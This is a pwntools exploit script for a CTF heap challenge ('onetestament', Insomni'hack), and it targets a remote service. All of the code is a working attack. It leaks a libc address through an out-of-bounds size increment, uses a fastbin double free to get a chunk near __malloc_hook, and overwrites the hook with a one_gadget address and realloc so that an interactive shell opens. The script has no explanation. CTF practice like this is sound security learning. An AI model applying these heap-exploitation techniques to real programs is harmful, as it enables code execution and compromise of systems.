#!/usr/bin/env python3

from pwn import *

exe = ELF("./ontestament_f83327bffbfb8a49014459cb2b95f68fa881394cf267ef0997ab2952cf481326_patched")
libc = ELF("./libc6_926ee3653de7b71c8567061f3a4dfbc2ea91b6df2b49a05f11351fe1addf20cf.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("onetestament.insomnihack.ch", 6666)

def sl(a, b):
    r.sendlineafter(a,b)

def s(a,b):
    r.sendafter(a,b)

def alloc(size, content):
    sl(b"choice: ", b"1")
    sl(b"choice: ", str(size).encode())
    sl(b"content: ", content)

def free(index):
    sl(b"choice: ", b"4")
    s(b'index: ', index)

def inc_oob(chunk, index):
    sl("choice: ", "3")
    sl("index: ", str(chunk))
    sl("content: ", str(index))

def main():
    # sizes can be from 1 to 4.
    # 1 0x18
    # 2 0x30
    # 3 0x60
    # 4 0x7c
    
    alloc(1, b"oob") # 0
    alloc(4, b"MAHER") # 1
    alloc(1, b"AZZOUZI") # 2
    free(b"1")
    
    inc_oob(0, 0x18)
    inc_oob(0, 0x18)
    #inc_oob(0, 0x18)

    alloc(4, "")
    libc_leak = u64(r.recvuntil(b"\x7f")[-6::].ljust(8, p8(0)))
    log.warn("Libc leak @ " + hex(libc_leak))
    libc.address = libc_leak - 0x3c4b0a
    log.warn("Libc base @ " + hex(libc.address))
    
    alloc(3, b"Targeting libc") # 3
    alloc(3, b"libc attack") # 4

    pause()
    free(b"4")
    free(b"5")
    free(b"4\x00\x00\x001")

    alloc(3, p64(libc.address + 0x3c4aed))
    alloc(3, b"MAHER")
    alloc(3, "Hi")
    alloc(3, b"M"*(0x13-8) + p64(libc.address + 0x4527a) + p64(libc.sym.realloc + 2))

    r.interactive()


if __name__ == "__main__":
    main()
